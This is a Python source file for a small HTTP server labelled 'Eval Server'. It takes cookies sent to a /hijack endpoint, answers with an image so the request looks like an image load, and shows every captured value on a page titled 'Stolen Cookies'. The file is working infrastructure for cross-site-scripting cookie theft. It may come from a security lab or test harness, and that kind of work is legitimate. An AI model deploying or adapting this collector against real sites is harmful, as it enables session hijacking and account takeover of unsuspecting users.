from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse as urlparse

stolen_cookies = []

class EvalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse.urlparse(self.path)
        if parsed_path.path == '/hijack':
            query = urlparse.parse_qs(parsed_path.query)
            cookie = query.get('cookie', [''])[0]
            if cookie:
                stolen_cookies.append(cookie)
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.end_headers()
            with open('cookie_monster.jpg', 'rb') as file:
                self.wfile.write(file.read())
        else:
            # Display the stolen cookies
            cookies_html = '<ul>'
            for cookie in stolen_cookies:
                cookies_html += f'<li>{cookie}</li>'
            cookies_html += '</ul>'
            
            content = f'''
            <!doctype html>
            <html lang="en">
            <head>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <title>Eval Server</title>
                <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
            </head>
            <body>
                <div class="container mt-5">
                    <h1 class="mb-4">Stolen Cookies</h1>
                    {cookies_html}
                </div>
            </body>
            </html>
            '''
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(content.encode('utf-8'))

def run_eval_server(server_class=HTTPServer, handler_class=EvalHandler, port=8081):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting eval server on port {port}')
    httpd.serve_forever()

if __name__ == "__main__":
    run_eval_server()
